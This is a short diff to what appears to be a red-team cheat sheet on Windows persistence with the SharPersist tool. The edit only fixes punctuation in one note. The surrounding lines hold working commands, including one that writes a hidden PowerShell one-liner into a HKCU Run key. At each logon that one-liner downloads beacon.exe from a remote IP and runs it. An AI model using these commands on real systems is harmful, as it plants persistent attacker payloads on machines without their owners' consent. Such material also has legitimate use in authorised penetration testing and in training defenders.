@@ -26,7 +26,7 @@ execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
 ```
 
 ### Registry AutoRun
-Requires admin access for "hklmrun"; there is a length limit on the key value)
+Requires admin access for "hklmrun", also there is a length limit on the key value.
 ```powershell
 execute-assembly /root/SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-w hidden -c \"$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://192.168.80.100/beacon.exe','C:\windows\temp\beacon.exe'); Start-Process -f 'C:\windows\temp\beacon.exe'\"" -k "hkcurun" -v "Name" -m add
 execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -v "Name" -m remove
